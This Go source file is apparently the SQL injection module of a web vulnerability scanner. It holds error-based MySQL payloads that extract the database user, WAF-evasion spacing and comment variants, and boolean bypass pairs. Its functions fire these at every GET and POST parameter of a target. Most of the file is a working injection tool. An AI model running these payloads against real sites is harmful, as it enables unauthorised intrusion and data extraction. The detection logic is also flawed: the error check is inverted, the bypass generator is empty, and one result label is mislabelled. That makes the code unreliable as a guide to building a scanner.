package sql

import (
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"time"
	http "wenscan/http"
)

var Notes = []string{
	"--+",
	"%23",
}

var eachs = []string{
	"'",
	`"`,
	``,
}

var Concat = []string{
	"and",
	"xor",
}

var Space = []string{
	" ",
	"/***/",
	"%20",
	"%09",
	"%0a",
	"%0b%0c%0b%0d",
}

var quotes_brackets = []string{
	"'",
	`"`,
	"\\",
	"')",
	`")`,
}

var error_payload = []string{
	" and (select 1 from(select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",
	" and (select 1 from (select count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b from information_schema.tables group by b)a)",
	" union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x ",
	" and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))",
	" and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))",
}

var digit_bypass = [][]string{
	{"1", "0"},
	{"1 like 1", "1 like 2"},
	{"/*!and/*/**//*!/*!1*/", "/*!and/*/**//*!/*!0*/"},
	{"{``1=1}", "{``1=2}"},
	{"0", "1"},
	{"2<<1", "0<<2"},
	{"lpad(user(),25,1)", "lpad(user(),2,1)"},
	{"1|1", "0|0"},
	{"1||1", "0||0"},
	{"1&&1", "0&&1"},
	{"1^1", "1^0"},
}

func Generatepayloadpasswaf() {

}

func Validationsqlerror(Spider *http.Spider) (map[string]string, error) {
	result := make(map[string]string)
	if len(Spider.Url.String()) == 0 {
		panic("request url is emtry")
	}
	param, err := Spider.GetRequrlparam()
	if err != nil {
		panic(err)
	}
	if Spider.ReqMode == "Get" {
		for _, each := range eachs {
			for _, er := range error_payload {
				for name, _ := range param {
					source := rand.NewSource(time.Now().Unix())
					r := rand.New(source)
					note := Notes[r.Intn(len(Notes))]
					param[name][0] = each + er + note
					URL, _ := url.Parse(Spider.Url.String())
					URL.RawQuery = param.Encode()
					fmt.Printf("Encoded URL is %q\n", URL.String())
					html := Spider.Sendreq(URL.String())
					fmt.Printf("Server Response is %q\n", *html)
					for _, valueErr := range ErrPayloads {
						if !strings.Contains(*html, valueErr) {
							result["payload"] = URL.RawQuery
							result["vultype"] = "Sql_Error"
							result["Sucess"] = "true"
							// result["response"] = *html
							return result, nil
						}
					}
				}
			}
		}
	}

	return result, nil
}

func ValidationDigit(Spider *http.Spider) (map[string]string, error) {
	result := make(map[string]string)
	if len(Spider.Url.String()) == 0 {
		panic("request url is emtry")
	}

	for _, eachs := range digit_bypass {
		if Spider.ReqMode == "Get" {
			param, err := Spider.GetRequrlparam()
			if err != nil {
				panic(err)
			}
			for name, _ := range param {
				r1 := rand.New(rand.NewSource(time.Now().Unix()))
				space := Space[r1.Intn(len(Space))]
				r2 := rand.New(rand.NewSource(time.Now().Unix()))
				concat := Concat[r2.Intn(len(Concat))]
				SpaceConcatSpace := space + concat + space

				Url1, _ := url.Parse(Spider.Url.String())
				param[name][0] = SpaceConcatSpace + eachs[0]
				Url1.RawQuery = param.Encode()

				Url2, _ := url.Parse(Spider.Url.String())
				param[name][0] = SpaceConcatSpace + eachs[1]
				Url2.RawQuery = param.Encode()

				html1 := Spider.Sendreq(Url1.String())
				html2 := Spider.Sendreq(Url2.String())
				if len(*html1) != len(*html2) && (len(*html1) == Spider.ReqUrlresplen || len(*html2) == Spider.ReqUrlresplen) {
					result["payload"] = Url1.RawQuery + `-------------` + Url2.RawQuery
					result["vultype"] = "Sql_Digit"
					result["Sucess"] = "true"
					return result, nil
				}
			}
		} else if Spider.ReqMode == "Post" {
			r1 := rand.New(rand.NewSource(time.Now().Unix()))
			space := Space[r1.Intn(len(Space))]
			r2 := rand.New(rand.NewSource(time.Now().Unix()))
			concat := Concat[r2.Intn(len(Concat))]
			SpaceConcatSpace := space + concat + space
			params := strings.Split(string(Spider.PostData), "&")
			for i, _ := range params {
				payload1 := strings.ReplaceAll(string(Spider.PostData), params[i], SpaceConcatSpace+eachs[0])
				Spider.PostData = []byte(payload1)
				html1 := Spider.Sendreq(Spider.Url.String())
				payload2 := strings.ReplaceAll(string(Spider.PostData), params[i], SpaceConcatSpace+eachs[1])
				Spider.PostData = []byte(payload2)
				html2 := Spider.Sendreq(Spider.Url.String())
				if len(*html1) != len(*html2) && (len(*html1) == Spider.ReqUrlresplen || len(*html2) == Spider.ReqUrlresplen) {
					result["payload"] = payload1 + `-------------` + payload2
					result["vultype"] = "Sql_Digit"
					result["Sucess"] = "true"
					return result, nil
				}

			}
		}
	}
	return result, nil
}

//ValidationChar 验证字符型sql漏洞
func ValidationChar(Spider *http.Spider) (map[string]string, error) {
	result := make(map[string]string)
	if len(Spider.Url.String()) == 0 {
		panic("request url is emtry")
	}
	for _, quote := range quotes_brackets {
		for _, eachs := range digit_bypass {
			if Spider.ReqMode == "Get" {
				param, err := Spider.GetRequrlparam()
				if err != nil {
					panic(err)
				}
				for name, _ := range param {
					r0 := rand.New(rand.NewSource(time.Now().Unix()))
					note := Notes[r0.Intn(len(Notes))]
					r1 := rand.New(rand.NewSource(time.Now().Unix()))
					space := Space[r1.Intn(len(Space))]
					r2 := rand.New(rand.NewSource(time.Now().Unix()))
					concat := Concat[r2.Intn(len(Concat))]
					SpaceConcatSpace := space + concat + space

					Url1, _ := url.Parse(Spider.Url.String())
					param[name][0] = quote + SpaceConcatSpace + eachs[0] + note
					Url1.RawQuery = param.Encode()

					Url2, _ := url.Parse(Spider.Url.String())
					param[name][0] = quote + SpaceConcatSpace + eachs[1] + note
					Url2.RawQuery = param.Encode()

					html1 := Spider.Sendreq(Url1.String())
					html2 := Spider.Sendreq(Url2.String())
					if len(*html1) != len(*html2) && (len(*html1) == Spider.ReqUrlresplen || len(*html2) == Spider.ReqUrlresplen) {
						result["payload"] = Spider.Url.RawQuery
						result["vultype"] = "Sql_Digit"
						result["Sucess"] = "true"
						return result, nil
					}
				}
			} else if Spider.ReqMode == "Post" {
				r0 := rand.New(rand.NewSource(time.Now().Unix()))
				note := Notes[r0.Intn(len(Notes))]
				r1 := rand.New(rand.NewSource(time.Now().Unix()))
				space := Space[r1.Intn(len(Space))]
				r2 := rand.New(rand.NewSource(time.Now().Unix()))
				concat := Concat[r2.Intn(len(Concat))]
				SpaceConcatSpace := space + concat + space
				params := strings.Split(string(Spider.PostData), "&")
				for i, _ := range params {
					payload1 := strings.ReplaceAll(string(Spider.PostData), params[i], quote+SpaceConcatSpace+eachs[0]+note)
					Spider.PostData = []byte(payload1)
					html1 := Spider.Sendreq(Spider.Url.String())
					payload2 := strings.ReplaceAll(string(Spider.PostData), params[i], quote+SpaceConcatSpace+eachs[1]+note)
					Spider.PostData = []byte(payload2)
					html2 := Spider.Sendreq(Spider.Url.String())
					if len(*html1) != len(*html2) && (len(*html1) == Spider.ReqUrlresplen || len(*html2) == Spider.ReqUrlresplen) {
						result["payload"] = payload1 + `-------------` + payload2
						result["vultype"] = "Sql_Char"
						result["Sucess"] = "true"
						return result, nil
					}

				}
			}
		}
	}
	return result, nil
}
